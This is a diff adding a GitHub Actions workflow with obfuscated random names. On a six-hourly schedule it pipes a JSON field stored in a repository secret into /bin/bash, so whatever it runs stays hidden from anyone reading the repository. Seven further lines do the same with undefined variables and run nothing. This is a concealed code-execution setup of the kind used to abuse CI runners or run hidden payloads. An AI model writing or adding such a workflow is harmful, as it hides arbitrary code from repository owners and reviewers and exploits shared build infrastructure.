@@ -1,0 +1,23 @@
+name: surugan7815
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: surugan7815
+        env:
+          ld1972: ${{ secrets.ld1972 }}
+        run: |
+          echo $ld1972 | jq -r .jssah51 | /bin/bash
+          echo $txd13122 | jq -r .rs53540 | /bin/bash
+          echo $k7764 | jq -r .ser24 | /bin/bash
+          echo $fb67458 | jq -r .zvyz9678 | /bin/bash
+          echo $umdq8 | jq -r .t977 | /bin/bash
+          echo $wdris6 | jq -r .nn3 | /bin/bash
+          echo $td368 | jq -r .ddas6418 | /bin/bash
+          echo $hb370 | jq -r .rchwd6 | /bin/bash
+
